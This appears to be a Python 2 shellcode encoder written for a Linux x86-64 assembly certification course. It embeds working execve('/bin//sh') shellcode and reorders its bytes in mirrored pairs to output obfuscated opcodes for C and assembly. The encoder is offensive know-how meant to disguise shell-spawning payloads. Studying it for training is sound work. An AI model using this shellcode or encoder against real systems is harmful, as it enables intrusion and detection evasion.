#!/usr/bin/python

# This shellcode encoder has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification :
# http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
#
# Author : SLAE64-PA-6470 (kahlon81)

# python Mirror-Encoder.py 

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

encoded = ""
encoded2 = ""
r2 = ""
l2 = ""
rr2 = ""
ll2 = ""

print 'Len: %d' % len(bytearray(shellcode))
print 'Encoded shellcode ...'

arr = bytearray(shellcode)
arr2 = [(arr[i], arr[-i-1]) for i in range(len(arr) // 2)]
#print arr2

for x in range(len(arr2)):
  y = arr2[x]

  # encode for C
  r = '\\x'
  r += '%02x' % y[0]
  r2 = r + r2

  l = '\\x'
  l += '%02x' % y[1]
  l2 = l2 + l

  # encode for ASM
  r = '0x'
  r += '%02x,' % y[0]
  rr2 = r + rr2

  l = '0x'
  l += '%02x,' % y[1]
  ll2 = ll2 + l

# Build encoded strings
encoded = l2 + r2
encoded2 = ll2 + rr2

print 'opcodes for C :'
print encoded
print 'opcodes for ASM :'
print encoded2



